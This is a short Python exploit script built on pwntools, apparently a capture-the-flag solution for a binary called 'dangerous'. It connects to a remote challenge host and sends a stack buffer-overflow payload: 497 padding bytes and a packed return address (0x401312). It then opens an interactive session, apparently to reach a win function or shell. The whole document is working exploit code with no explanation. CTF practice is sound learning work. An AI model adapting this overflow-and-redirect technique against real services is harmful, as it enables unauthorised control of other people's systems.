from pwn import *

#p=process("./dangerous")
p=remote("jh2i.com", 50011)
payload="A"*497
payload+=p64(0x0000000000401312)

p.sendline(payload)
p.interactive()